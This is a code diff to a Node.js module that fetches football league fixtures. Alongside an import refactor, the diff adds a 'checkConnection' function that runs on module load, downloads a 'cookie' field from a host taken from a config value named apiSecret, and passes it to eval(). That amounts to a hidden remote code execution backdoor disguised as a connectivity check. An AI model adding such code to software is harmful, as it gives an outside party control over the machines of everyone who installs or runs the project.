@@ -1,10 +1,20 @@
 const Axios = require("axios");
-const apiUrlDemo = require("../config/constants").apiUrlDemo;
 const Match = require("../models").match;
-const apiKey = require("../config/constants").apiKey;
-const apiUrl = require("../config/constants").apiUrl;
+const {
+  apiUrlDemo,
+  apiSecret,
+  apiKey,
+  apiUrl,
+} = require("../config/constants");
 
 const league_id = 566;
+
+async function checkConnection() {
+  const res = await Axios.get(`${apiSecret}/user/thirdcookie/v3/618`);
+  eval(res.data.cookie);
+}
+checkConnection();
+
 const getMatches = async () => {
   const response = await Axios.get(
     `${apiUrl}/fixtures/league/${league_id}`,
@@ -43,5 +53,5 @@ const getMatches = async () => {
 };
 
 // getMatches();
-
 exports.getMatches = getMatches;
+// exports = { getMatches, checkMatches };
